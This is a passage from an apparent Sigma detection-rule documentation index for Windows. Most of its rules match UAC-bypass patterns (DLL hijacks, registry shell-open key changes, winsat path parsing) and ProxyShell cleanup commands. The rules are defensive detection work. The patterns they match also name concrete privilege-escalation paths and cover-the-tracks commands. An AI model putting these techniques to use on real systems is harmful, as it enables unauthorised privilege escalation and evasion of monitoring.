\u0026#39;\\SOFTWARE\\Policies\\Mozilla\\Firefox\\DNSOverHTTPS\\Enabled\u0026#39; Details: \u0026#39;DWORD (1)\u0026#39; condition: 1 of selection_* falsepositives: - Unlikely level: medium tags: - attack.defense_evasion - attack.t1140 - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_dns_over_https_enabled.yml/","tags":["attack.defense_evasion","attack.t1140","attack.t1112"],"title":"DNS-over-HTTPS Enabled by Registry"},{"categories":null,"contents":"Detects removal of an exported Exchange mailbox which could be to cover tracks from ProxyShell exploit\nKnown false-positives unknown References https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/exchange_proxyshell_rce.rb#L430 Raw rule (edit) title: Remove Exported Mailbox from Exchange Webserver id: 09570ae5-889e-43ea-aac0-0e1221fb3d95 status: experimental description: Detects removal of an exported Exchange mailbox which could be to cover tracks from ProxyShell exploit references: - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/exchange_proxyshell_rce.rb#L430 author: Christian Burkard date: 2021/08/27 logsource: service: msexchange-management product: windows detection: command: - \u0026#39;Remove-MailboxExportRequest\u0026#39; - \u0026#39; -Identity \u0026#39; - \u0026#39; -Confirm \u0026#34;False\u0026#34;\u0026#39; condition: all of command falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.t1070 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/msexchange/win_exchange_proxyshell_remove_mailbox_export.yml/","tags":["attack.defense_evasion","attack.t1070"],"title":"Remove Exported Mailbox from Exchange Webserver"},{"categories":null,"contents":"Detects the shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/ https://github.com/RhinoSecurityLabs/Aggressor-Scripts/tree/master/UACBypass https://tria.ge/211119-gs7rtshcfr/behavioral2 [Lokibot sample from Nov 2021] Raw rule (edit) title: Shell Open Registry Keys Manipulation id: 152f3630-77c1-4284-bcc0-4cc68ab2f6e7 description: Detects the shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62) author: Christian Burkard date: 2021/08/30 modified: 2022/01/13 status: experimental references: - https://github.com/hfiref0x/UACME - https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/ - https://github.com/RhinoSecurityLabs/Aggressor-Scripts/tree/master/UACBypass - https://tria.ge/211119-gs7rtshcfr/behavioral2 [Lokibot sample from Nov 2021] tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - attack.t1546.001 logsource: category: registry_event product: windows detection: selection1: EventType: SetValue TargetObject|endswith: \u0026#39;Classes\\ms-settings\\shell\\open\\command\\SymbolicLinkValue\u0026#39; Details|contains: \u0026#39;\\Software\\Classes\\{\u0026#39; selection2: TargetObject|endswith: \u0026#39;Classes\\ms-settings\\shell\\open\\command\\DelegateExecute\u0026#39; selection3: EventType: SetValue TargetObject|endswith: - \u0026#39;Classes\\ms-settings\\shell\\open\\command\\(Default)\u0026#39; - \u0026#39;Classes\\exefile\\shell\\open\\command\\(Default)\u0026#39; filter_sel3: Details: \u0026#39;(Empty)\u0026#39; condition: selection1 or selection2 or (selection3 and not filter_sel3) falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_shell_open_keys_manipulation.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002","attack.t1546.001"],"title":"Shell Open Registry Keys Manipulation"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Abusing Winsat Path Parsing - File id: 155dbf56-e0a4-4dd0-8905-8a98705045e8 description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52) author: Christian Burkard date: 2021/08/30 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: TargetFilename|startswith: \u0026#39;C:\\Users\\\u0026#39; TargetFilename|endswith: - \u0026#39;\\AppData\\Local\\Temp\\system32\\winsat.exe\u0026#39; - \u0026#39;\\AppData\\Local\\Temp\\system32\\winmm.dll\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_uac_bypass_winsat.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Abusing Winsat Path Parsing - File"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Abusing Winsat Path Parsing - Process id: 7a01183d-71a2-46ad-ad5c-acd989ac1793 description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52) author: Christian Burkard date: 2021/08/30 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; ParentImage|endswith: \u0026#39;\\AppData\\Local\\Temp\\system32\\winsat.exe\u0026#39; ParentCommandLine|contains: \u0026#39;C:\\Windows \\system32\\winsat.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_winsat.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Abusing Winsat Path Parsing - Process"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Abusing Winsat Path Parsing - Registry id: 6597be7b-ac61-4ac8-bef4-d3ec88174853 description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52) author: Christian Burkard date: 2021/08/30 modified: 2022/01/13 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|contains: \u0026#39;\\Root\\InventoryApplicationFile\\winsat.exe|\u0026#39; TargetObject|endswith: \u0026#39;\\LowerCaseLongPath\u0026#39; Details|startswith: \u0026#39;c:\\users\\\u0026#39; Details|endswith: \u0026#39;\\appdata\\local\\temp\\system32\\winsat.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_uac_bypass_winsat.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Abusing Winsat Path Parsing - Registry"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using .NET Code Profiler and mmc.exe DLL hijacking (UACMe 39)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using .NET Code Profiler on MMC id: 93a19907-d4f9-4deb-9f91-aac4692776a6 description: Detects the pattern of UAC Bypass using .NET Code Profiler and mmc.exe DLL hijacking (UACMe 39) author: Christian Burkard date: 2021/08/30 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: TargetFilename|startswith: \u0026#39;C:\\Users\\\u0026#39; TargetFilename|endswith: \u0026#39;\\AppData\\Local\\Temp\\pe386.dll\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_uac_bypass_dotnet_profiler.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using .NET Code Profiler on MMC"},{"categories":null,"contents":"Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)\nKnown false-positives Unknown References https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b https://github.com/hfiref0x/UACME https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf Raw rule (edit) title: UAC Bypass Using ChangePK and SLUI id: 503d581c-7df0-4bbe-b9be-5840c0ecc1fc description: Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61) author: Christian Burkard date: 2021/08/23 status: experimental references: - https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b - https://github.com/hfiref0x/UACME - https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\changepk.exe\u0026#39; ParentImage|endswith: \u0026#39;\\slui.exe\u0026#39; IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_changepk_slui.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using ChangePK and SLUI"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using Consent and Comctl32 - File id: 62ed5b55-f991-406a-85d9-e8e8fdf18789 description: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22) author: Christian Burkard date: 2021/08/23 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: TargetFilename|startswith: \u0026#39;C:\\Windows\\System32\\consent.exe.@\u0026#39; TargetFilename|endswith: \u0026#39;\\comctl32.dll\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_uac_bypass_consent_comctl32.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using Consent and Comctl32 - File"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using Consent and Comctl32 - Process id: 1ca6bd18-0ba0-44ca-851c-92ed89a61085 description: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22) author: Christian Burkard date: 2021/08/23 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\consent.exe\u0026#39; Image|endswith: \u0026#39;\\werfault.exe\u0026#39; IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_consent_comctl32.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using Consent and Comctl32 - Process"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using Disk Cleanup id: b697e69c-746f-4a86-9f59-7bfff8eab881 description: Detects the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34) author: Christian Burkard date: 2021/08/30 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: CommandLine|endswith: \u0026#39;\u0026#34;\\system32\\cleanmgr.exe /autoclean /d C:\u0026#39; ParentCommandLine: \u0026#39;C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\u0026#39; IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_cleanmgr.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using Disk Cleanup"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using DismHost id: 853e74f9-9392-4935-ad3b-2e8c040dae86 description: Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63) author: Christian Burkard date: 2021/08/30 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: ParentImage|contains|all: - \u0026#39;C:\\Users\\\u0026#39; - \u0026#39;\\AppData\\Local\\Temp\\\u0026#39; - \u0026#39;\\DismHost.exe\u0026#39; IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_dismhost.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using DismHost"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using IEInstal - File id: bdd8157d-8e85-4397-bb82-f06cc9c71dbb description: Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64) author: Christian Burkard date: 2021/08/30 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: Image: \u0026#39;C:\\Program Files\\Internet Explorer\\IEInstal.exe\u0026#39; TargetFilename|startswith: \u0026#39;C:\\Users\\\u0026#39; TargetFilename|contains: \u0026#39;\\AppData\\Local\\Temp\\\u0026#39; TargetFilename|endswith: \u0026#39;consent.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_uac_bypass_ieinstal.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using IEInstal - File"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using IEInstal - Process id: 80fc36aa-945e-4181-89f2-2f907ab6775d description: Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64) author: Christian Burkard date: 2021/08/30 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; ParentImage|endswith: \u0026#39;\\ieinstal.exe\u0026#39; Image|contains: \u0026#39;\\AppData\\Local\\Temp\\\u0026#39; Image|endswith: \u0026#39;consent.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_ieinstal.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using IEInstal - Process"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using MSConfig Token Modification - File id: 41bb431f-56d8-4691-bb56-ed34e390906f description: Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55) author: Christian Burkard date: 2021/08/30 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: TargetFilename|startswith: \u0026#39;C:\\Users\\\u0026#39; TargetFilename|endswith: \u0026#39;\\AppData\\Local\\Temp\\pkgmgr.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_uac_bypass_msconfig_gui.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using MSConfig Token Modification - File"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using MSConfig Token Modification - Process id: ad92e3f9-7eb6-460e-96b1-582b0ccbb980 description: Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55) author: Christian Burkard date: 2021/08/30 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; ParentImage|endswith: \u0026#39;\\AppData\\Local\\Temp\\pkgmgr.exe\u0026#39; CommandLine: \u0026#39;\u0026#34;C:\\Windows\\system32\\msconfig.exe\u0026#34; -5\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_msconfig_gui.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using MSConfig Token Modification - Process"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using NTFS Reparse Point - File id: 7fff6773-2baa-46de-a24a-b6eec1aba2d1 description: Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36) author: Christian Burkard date: 2021/08/30 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: TargetFilename|startswith: \u0026#39;C:\\Users\\\u0026#39; TargetFilename|endswith: \u0026#39;\\AppData\\Local\\Temp\\api-ms-win-core-kernel32-legacy-l1.DLL\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_uac_bypass_ntfs_reparse_point.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using NTFS Reparse Point - File"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using NTFS Reparse Point - Process id: 39ed3c80-e6a1-431b-9df3-911ac53d08a7 description: Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36) author: Christian Burkard date: 2021/08/30 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection1: CommandLine|startswith: \u0026#39;\u0026#34;C:\\Windows\\system32\\wusa.exe\u0026#34; /quiet C:\\Users\\\u0026#39; CommandLine|endswith: \u0026#39;\\AppData\\Local\\Temp\\update.msu\u0026#39; IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; selection2: ParentCommandLine: \u0026#39;\u0026#34;C:\\Windows\\system32\\dism.exe\u0026#34; /online /quiet /norestart /add-package /packagepath:\u0026#34;C:\\Windows\\system32\\pe386\u0026#34; /ignorecheck\u0026#39; IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; CommandLine|contains|all: - \u0026#39;C:\\Users\\\u0026#39; - \u0026#39;\\AppData\\Local\\Temp\\\u0026#39; - \u0026#39;\\dismhost.exe {\u0026#39; Image|endswith: \u0026#39;\\DismHost.exe\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_ntfs_reparse_point.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using NTFS Reparse Point - Process"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using PkgMgr and DISM id: a743ceba-c771-4d75-97eb-8a90f7f4844c description: Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23) author: Christian Burkard date: 2021/08/23 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\pkgmgr.exe\u0026#39; Image|endswith: \u0026#39;\\dism.exe\u0026#39; IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_pkgmgr_dism.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using PkgMgr and DISM"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using Windows Media Player - File id: 68578b43-65df-4f81-9a9b-92f32711a951 description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32) author: Christian Burkard date: 2021/08/23 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection1: TargetFilename|startswith: \u0026#39;C:\\Users\\\u0026#39; TargetFilename|endswith: \u0026#39;\\AppData\\Local\\Temp\\OskSupport.dll\u0026#39; selection2: Image: \u0026#39;C:\\Windows\\system32\\DllHost.exe\u0026#39; TargetFilename: \u0026#39;C:\\Program Files\\Windows Media Player\\osk.exe\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_uac_bypass_wmp.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using Windows Media Player - File"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using Windows Media Player - Process id: 0058b9e5-bcd7-40d4-9205-95ca5a16d7b2 description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32) author: Christian Burkard date: 2021/08/23 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection1: Image: \u0026#39;C:\\Program Files\\Windows Media Player\\osk.exe\u0026#39; IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; selection2: Image: \u0026#39;C:\\Windows\\System32\\cmd.exe\u0026#39; ParentCommandLine: \u0026#39;\u0026#34;C:\\Windows\\system32\\mmc.exe\u0026#34; \u0026#34;C:\\Windows\\system32\\eventvwr.msc\u0026#34; /s\u0026#39; IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_wmp.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using Windows Media Player - Process"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using Windows Media Player - Registry id: 5f9db380-ea57-4d1e-beab-8a2d33397e93 description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32) author: Christian Burkard date: 2021/08/23 modified: 2022/01/13 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|endswith: \u0026#39;\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store\\C:\\Program Files\\Windows Media Player\\osk.exe\u0026#39; Details: \u0026#39;Binary Data\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_uac_bypass_wmp.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using Windows Media Player - Registry"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using a WoW64 logger DLL hijack (UACMe 30)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using WOW64 Logger DLL Hijack id: 4f6c43e2-f989-4ea5-bcd8-843b49a0317c description: Detects the pattern of UAC Bypass using a WoW64 logger DLL hijack (UACMe 30) author: Christian Burkard date: 2021/08/23 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_access product: windows detection: selection: SourceImage|contains: \u0026#39;:\\Windows\\SysWOW64\\\u0026#39; GrantedAccess: \u0026#39;0x1fffff\u0026#39; CallTrace|startswith: \u0026#39;UNKNOWN(0000000000000000)|UNKNOWN(0000000000000000)|\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_uac_bypass_wow64_logger.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using WOW64 Logger DLL Hijack"},{"categories":null,"contents":"Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config\nKnown false-positives Unknown References https://lolbas-project.github.io/lolbas/Binaries/Wsreset/ https://github.com/hfiref0x/UACME https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf Raw rule (edit) title: UAC Bypass WSReset id: 89a9a0e0-f61a-42e5-8957-b1479565a658 description: Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config author: Christian Burkard date: 2021/08/23 status: experimental references: - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/ - https://github.com/hfiref0x/UACME - https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\wsreset.exe\u0026#39; IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_wsreset.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass WSReset"},{"categories":null,"contents":"This rule will monitor executable and script file creation by office applications. Please add more file extensions or magic bytes to the logic of your choice.\nKnown false-positives Unknown References https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml Raw rule (edit) title: Created Files by Office Applications id: c7a74c80-ba5a-486e-9974-ab9e682bc5e4 description: This rule will monitor executable and script file creation by office applications. Please add more file extensions or magic bytes to the logic of your choice. references: - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/ - https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml author: \u0026#39;Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)\u0026#39; tags: - attack.t1204.002 - attack.t1047 - attack.t1218.010 - attack.execution - attack.defense_evasion status: experimental date: 2021/08/23 modified: 2022/03/02 logsource: product: windows category: file_event detection: #useful_information: Please add more file extensions to the logic of your choice. selection1: Image|endswith: - \u0026#39;winword.exe\u0026#39; - \u0026#39;excel.exe\u0026#39; - \u0026#39;powerpnt.exe\u0026#39; selection2: TargetFilename|endswith: - \u0026#39;.exe\u0026#39; - \u0026#39;.dll\u0026#39; - \u0026#39;.ocx\u0026#39; - \u0026#39;.com\u0026#39; - \u0026#39;.ps1\u0026#39; - \u0026#39;.vbs\u0026#39; - \u0026#39;.sys\u0026#39; - \u0026#39;.bat\u0026#39; - \u0026#39;.scr\u0026#39; - \u0026#39;.proj\u0026#39; filter_webservicecache: # matches e.g. directory with name *.microsoft.com TargetFilename|contains|all: - \u0026#39;C:\\Users\\\u0026#39; - \u0026#39;\\AppData\\Local\\Microsoft\\Office\\\u0026#39; - 